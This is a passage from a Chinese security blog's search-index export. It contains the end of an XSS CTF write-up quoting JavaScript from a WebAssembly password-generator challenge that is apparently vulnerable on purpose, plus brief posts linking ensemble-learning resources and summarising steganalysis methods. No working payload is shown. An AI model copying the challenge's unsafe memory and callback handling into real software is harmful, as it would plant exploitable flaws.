class="keyword">let</span> idx = <span class="number">0</span>; idx &lt; json.<span class="property">length</span>; ++idx) &#123;</span><br><span class="line">        u8[options + idx] = json.<span class="title function_">codePointAt</span>(idx) % <span class="number">0xff</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    u8[options + json.<span class="property">length</span>] = <span class="number">0</span>;</span><br><span class="line">    wasm.<span class="property">instance</span>.<span class="property">exports</span>.<span class="title function_">generate_password</span>(options, password);</span><br><span class="line">    <span class="keyword">let</span> output_password = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> idx = <span class="number">0</span>; idx &lt; passwordLength; ++idx) &#123;</span><br><span class="line">        output_password += <span class="title class_">String</span>.<span class="title function_">fromCodePoint</span>(u8[password + idx]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">showMessage</span>(<span class="string">&quot;Password Generated&quot;</span>, <span class="string">&quot;Your password is: &quot;</span> + output_password, &#123;</span><br><span class="line">        <span class="attr">text</span>: <span class="string">&quot;OK&quot;</span>,</span><br><span class="line">        <span class="attr">action</span>: <span class="string">&quot;generateAnother();&quot;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">generateAnother</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>;</span><br><span class="line">    params.<span class="title function_">set</span>(<span class="string">&quot;passwordLength&quot;</span>, inputFields.<span class="property">passwordLength</span>.<span class="property">value</span>);</span><br><span class="line">    params.<span class="title function_">set</span>(<span class="string">&quot;allowNumbers&quot;</span>, inputFields.<span class="property">allowNumbers</span>.<span class="property">checked</span>);</span><br><span class="line">    params.<span class="title function_">set</span>(<span class="string">&quot;allowSymbols&quot;</span>, inputFields.<span class="property">allowSymbols</span>.<span class="property">checked</span>);</span><br><span class="line">    params.<span class="title function_">set</span>(<span class="string">&quot;timestamp&quot;</span>, <span class="title class_">Number</span>(<span class="keyword">new</span> <span class="title class_">Date</span>));</span><br><span class="line">    location.<span class="property">search</span> = params;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> settings = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(location.<span class="property">search</span>);</span><br><span class="line">inputFields.<span class="property">passwordLength</span>.<span class="property">value</span> = settings.<span class="title function_">get</span>(<span class="string">&quot;passwordLength&quot;</span>) ?? <span class="number">8</span>;</span><br><span class="line">inputFields.<span class="property">allowNumbers</span>.<span class="property">checked</span> = settings.<span class="title function_">get</span>(<span class="string">&quot;allowNumbers&quot;</span>) !== <span class="string">&quot;false&quot;</span>;</span><br><span class="line">inputFields.<span class="property">allowSymbols</span>.<span class="property">checked</span> = settings.<span class="title function_">get</span>(<span class="string">&quot;allowSymbols&quot;</span>) !== <span class="string">&quot;false&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="what-is-wasm"><a href="#what-is-wasm" class="headerlink" title="what is wasm"></a>what is wasm</h3><blockquote>
<p>WebAssembly/<em>wasm</em> WebAssembly 或者 wasm 是一个可移植、体积小、加载快并且兼容 Web 的全新格式</p>
</blockquote>
<h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><p>可以自定义一个函数拿出来方便测试</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">generate2</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (generating) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">requestAnimationFrame</span>(<span class="function"><span class="params">_</span> =&gt;</span> (generating = <span class="literal">false</span>));</span><br><span class="line">    generating = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">let</span> passwordLength = inputFields.<span class="property">passwordLength</span>.<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">let</span> json = <span class="string">`&#123; &quot;passwordLength&quot;: <span class="subst">$&#123;passwordLength&#125;</span>, &quot;seed&quot;: <span class="subst">$&#123;crypto.getRandomValues(<span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">1</span>))[<span class="number">0</span>]&#125;</span>, &quot;allowNumbers&quot;: <span class="subst">$&#123;inputFields.allowNumbers.checked&#125;</span>, &quot;allowSymbols&quot;: <span class="subst">$&#123;inputFields.allowSymbols.checked&#125;</span> &#125;`</span>;</span><br><span class="line">    <span class="keyword">if</span> (!(passwordLength = passwordLength.<span class="title function_">match</span>(<span class="regexp">/^\d+$/gm</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">showMessage</span>(<span class="string">&quot;Error&quot;</span>, <span class="string">&quot;Password Length must be a number.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    passwordLength = <span class="title class_">Number</span>(passwordLength[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">let</span> wasm = <span class="keyword">await</span> <span class="title class_">WebAssembly</span>.<span class="title function_">instantiateStreaming</span>(<span class="title function_">fetch</span>(<span class="string">&quot;program.wasm&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">env</span>: &#123;</span><br><span class="line">            <span class="attr">log_str</span>: <span class="function"><span class="params">idx</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">while</span> (u8[idx] != <span class="number">0</span>) &#123;</span><br><span class="line">                    str += <span class="title class_">String</span>.<span class="title function_">fromCodePoint</span>(u8[idx]);</span><br><span class="line">                    ++idx;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(str);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">log_int</span>: <span class="variable language_">console</span>.<span class="property">log</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">let</span> u8 = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(wasm.<span class="property">instance</span>.<span class="property">exports</span>.<span class="property">memory</span>.<span class="property">buffer</span>);</span><br><span class="line">    <span class="keyword">let</span> options = wasm.<span class="property">instance</span>.<span class="property">exports</span>.<span class="title function_">malloc</span>(json.<span class="property">length</span> + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">let</span> password = wasm.<span class="property">instance</span>.<span class="property">exports</span>.<span class="title function_">malloc</span>(<span class="title class_">Number</span>(passwordLength) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> idx = <span class="number">0</span>; idx &lt; json.<span class="property">length</span>; ++idx) &#123;</span><br><span class="line">        u8[options + idx] = json.<span class="title function_">codePointAt</span>(idx) % <span class="number">0xff</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    u8[options + json.<span class="property">length</span>] = <span class="number">0</span>;</span><br><span class="line">    wasm.<span class="property">instance</span>.<span class="property">exports</span>.<span class="title function_">generate_password</span>(options, password);</span><br><span class="line">    <span class="keyword">let</span> output_password = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> idx = <span class="number">0</span>; idx &lt; passwordLength; ++idx) &#123;</span><br><span class="line">        output_password += <span class="title class_">String</span>.<span class="title function_">fromCodePoint</span>(u8[password + idx]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">showMessage</span>(<span class="string">&quot;Password Generated&quot;</span>, <span class="string">&quot;Your password is: &quot;</span> + output_password, &#123;</span><br><span class="line">        <span class="attr">text</span>: <span class="string">&quot;OK&quot;</span>,</span><br><span class="line">        <span class="attr">action</span>: <span class="string">&quot;generateAnother();&quot;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后用到了栈溢出的知识 看的蒙蒙的 。。。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://terjanq.medium.com/blind-sql-injection-without-an-in-1e14ba1d4952">https://terjanq.medium.com/blind-sql-injection-without-an-in-1e14ba1d4952</a></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>集成学习</title>
    <url>/2022/03/17/%E9%9B%86%E6%88%90%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="路线"><a href="#路线" class="headerlink" title="路线"></a>路线</h1><p>不多bb 直接开学好吧 卷起来</p>
<p><a href="https://www.bilibili.com/video/BV1wF411e73j?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV1wF411e73j?spm_id_from=333.337.search-card.all.click</a></p>
<p><a href="https://github.com/datawhalechina/ML-FTTI">https://github.com/datawhalechina/ML-FTTI</a></p>
<p><a href="https://datawhalechina.github.io/ML-FTTI/01_tree_ensemble/01_tree.html#id1">https://datawhalechina.github.io/ML-FTTI/01_tree_ensemble/01_tree.html#id1</a></p>
]]></content>
      <categories>
        <category>ML</category>
      </categories>
      <tags>
        <tag>集成学习</tag>
      </tags>
  </entry>
  <entry>
    <title>test</title>
    <url>/2022/03/07/test/</url>
    <content><![CDATA[<p>﻿## 抄书了</p>
<h2 id="隐写分析方法"><a href="#隐写分析方法" class="headerlink" title="隐写分析方法"></a>隐写分析方法</h2><ul>
<li>感官分析</li>
<li>特征分析</li>
<li>统计分析</li>
<li>通用分析</li>
</ul>
<h5 id="感官分析"><a href="#感官分析" class="headerlink" title="感官分析"></a>感官分析</h5><p> 优点：简单直观<br> 弱点：自动化程度若，可靠性弱</p>
<h5 id="特征分析"><a href="#特征分析" class="headerlink" title="特征分析"></a>特征分析</h5><p>基于文件结构的隐写特征<br>1.文件大小异常<br>2.调色板中有像素没有使用的颜色<br>。。。</p>
<p>软件特征<br>2006年高清晰度DVD视频播放器面世时，使用了强度较高的加密算法。可仅仅六个月之后，系统就被驳接了，问题不是出在算法上，而是算法的实现，攻击者能从内存获取密钥</p>
<p>隐写软件特征：<br><img src="https://img-blog.csdnimg.cn/20210628222012447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzNzU1MjE2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>隐写软件 TheThirdEye 的隐写标记： <a href="http://www.binary-technologies.com/">www.binary-techNologies.com</a><br><img src="https://img-blog.csdnimg.cn/20210628222134303.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzNzU1MjE2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>早期F5算法总插入 “<strong>JPEG Encoder Copyright 1998,James R.Weeks and BioElectroMech</strong>“, 而普通图像编辑器几乎不会插入这条信息</p>
<h5 id="统计分析"><a href="#统计分析" class="headerlink" title="统计分析"></a>统计分析</h5><ul>
<li>载体感官效果没有发生变化，但统计特征改变</li>
<li>分析待检测载体的统计特征，可以判断载体是否经过隐写</li>
<li>典型方法<br>1.卡方，RS检测等<br>2.JPEG检测等</li>
</ul>
<h5 id="通用分析"><a href="#通用分析" class="headerlink" title="通用分析"></a>通用分析</h5><p>原理：自然信号与其去噪信号的“距离”，隐写信号与其去噪信号的‘距离’，两者不同<br>提取出对隐写面擀得托干统计特征构成矢量<br>获取待检测信号与其去噪版本的特征矢量<br>判决</p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
      <tags>
        <tag>steganography</tag>
      </tags>
  </entry>
</search>
